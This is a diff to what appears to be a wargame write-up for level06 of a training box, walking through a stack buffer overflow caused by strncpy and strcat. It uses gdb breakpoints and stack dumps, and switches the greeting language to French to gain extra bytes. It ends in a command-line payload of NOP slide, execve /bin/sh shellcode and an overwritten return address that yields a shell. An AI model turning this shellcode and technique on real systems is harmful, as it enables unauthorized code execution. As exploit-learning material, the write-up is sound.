@@ -65,20 +65,118 @@ The strncpy is one part of the puzzle. Currently if we try to store name larger 
 There is another "unsafe" function: strcat. We are concatinating first the greeting ("Hi ", ...) into the greeting variable and then the name. However since the name doesn't have NUL byte it will actually concatinate the password as well and this will cause an overflow. We are trying to fit 72 bytes (name + password) + greeting into a 64 byte reserved space. We can clearly see this in action if we just try to run the program with the max name and password.
 
 ```console
+(gdb) r $(python -c 'print "A"*40 + " " + "B"*32')
+Starting program: /levels/level06 $(python -c 'print "A"*40 + " " + "B"*32')
+Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
 
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb)
 ```
 
-Here we can see the buffer is too small, thankfully we can add few more bytes by changing the LANG variable, I chose fr for french.
+We see both of them get printed out. Now we can set a few breakpoints to look at the buffer in crucial points in the program.
 
 ```console
+(gdb) disass main
+Dump of assembler code for function main:
+...
+0x080486a8 <+277>:	rep movsl %ds:(%esi),%es:(%edi)
+0x080486aa <+279>:	call   0x804851c <greetuser>
+0x080486af <+284>:	lea    -0xc(%ebp),%esp
+...
+(gdb) disass greetuser
+Dump of assembler code for function greetuser:
+...
+0x0804857e <+98>:	mov    %eax,(%esp)
+0x08048581 <+101>:	call   0x80483d0 <strcat@plt>
+0x08048586 <+106>:	lea    -0x48(%ebp),%eax
+0x08048589 <+109>:	mov    %eax,(%esp)
+0x0804858c <+112>:	call   0x80483f0 <puts@plt>
+0x08048591 <+117>:	leave  
+0x08048592 <+118>:	ret
+(gdb) b *0x08048581
+Breakpoint 1 at 0x8048581
+(gdb) b *0x08048591
+Breakpoint 2 at 0x8048591
+```
 
+We set the breakpoints before and after the strcat function to see what exactly happens (i.e. addresses: 0x08048581 and 0x08048591).
+
+```console
+(gdb) r $(python -c 'print "A"*40 + " " + "B"*32')
+Starting program: /levels/level06 $(python -c 'print "A"*40 + " " + "B"*32')
+
+Breakpoint 1, 0x08048581 in greetuser ()
+(gdb) x/52xw $esp
+0xbffffb00:	0xbffffb10	0xbffffb60	0x07b1ea71	0xbffffb30
+0xbffffb10:	0x6e656942	0x756e6576	0x00002065	0xb7e3bff0
+0xbffffb20:	0xbfffff6b	0xb7e15b58	0x00000002	0xb7fffc10
+0xbffffb30:	0xb7fe9eeb	0xbffffbb0	0x00000003	0xbffffbfc
+0xbffffb40:	0xbffffc18	0xb7ff05f0	0xbfffff6b	0xb7e85360
+0xbffffb50:	0xb7e85397	0x00000003	0xbffffc18	0x080486af
+0xbffffb60:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb70:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb80:	0x41414141	0x41414141	0x42424242	0x42424242
+0xbffffb90:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffffba0:	0x42424242	0x42424242	0x00000000	0x080482da
+0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
+(gdb) x/s 0xbffffb60
+0xbffffb60:	'A' <repeats 40 times>, 'B' <repeats 32 times>
+(gdb) c
+Continuing.
+Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Breakpoint 2, 0x08048591 in greetuser ()
+(gdb) x/52xw $esp
+0xbffffb00:	0xbffffb10	0xbffffb60	0x07b1ea71	0xbffffb30
+0xbffffb10:	0x41206948	0x41414141	0x41414141	0x41414141
+0xbffffb20:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb30:	0x41414141	0x41414141	0x42414141	0x42424242
+0xbffffb40:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffffb50:	0x42424242	0x42424242	0x00424242	0x080486af
+0xbffffb60:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb70:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb80:	0x41414141	0x41414141	0x42424242	0x42424242
+0xbffffb90:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffffba0:	0x42424242	0x42424242	0x00000000	0x080482da
+0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
+```
+We can see the A's and B's as well as the return address 0x080486af. We are not overwriting it right now, it seems the buffer is too small to reach it. Thankfully we can add few more bytes by changing the LANG variable, I chose fr for french.
+
+```console
+(gdb) set environment LANG=fr
+(gdb) r $(python -c 'print "A"*40 + " " + "B"*32')
+Starting program: /levels/level06 $(python -c 'print "A"*40 + " " + "B"*32')
+
+Breakpoint 1, 0x08048581 in greetuser ()
+(gdb) c
+Continuing.
+Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Breakpoint 2, 0x08048591 in greetuser ()
+(gdb) x/52xw $esp
+0xbffffb00:	0xbffffb10	0xbffffb60	0x07b1ea71	0xbffffb30
+0xbffffb10:	0x6e656942	0x756e6576	0x41412065	0x41414141
+0xbffffb20:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb30:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb40:	0x42424141	0x42424242	0x42424242	0x42424242
+0xbffffb50:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffffb60:	0x41004242	0x41414141	0x41414141	0x41414141
+0xbffffb70:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffb80:	0x41414141	0x41414141	0x42424242	0x42424242
+0xbffffb90:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffffba0:	0x42424242	0x42424242	0x00000000	0x080482da
+0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
 ```
 
 Now we overwrote the return address!
 
 
 
-We can also see after the 40 bytes the remaining size is 26 before we overwrite the return address, so we need to add 26random bytes (I chose "B" or \x42) and then append the starting address of the shellcode (in my case: 0xbffffb1a).
+We can also see after the 40 bytes of A's the remaining size is 26 before we overwrote the return address, so we need to add 26 random bytes (I chose "B" or \x42) and then append the starting address of the shellcode (in my case: 0xbffffb1a).
 
 So our total payload looks like this:
 ```console
@@ -100,9 +198,8 @@ process 3917 is executing new program: /bin/bash
 sh-4.3$
 ```
 
-After continuing throught our breakpoints we get the shell. If we however try this outside the gdb we get an error:
+After continuing throught our breakpoints we get the shell. I've also added a NOP slide (\x90 bytes) to help if the address was slightly off (this helps me in the future). If we however try this outside the gdb we get an error.
 
-I've also added a NOP slide (\x90 bytes) to help if the address was slightly off (this helps me in the future).
 
 ```console
 level6@io:/levels$ ./level06 $(python -c 'print "\x90"*17 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + " " + "B"*26 + "\x1a\xfb\xff\xbf"')
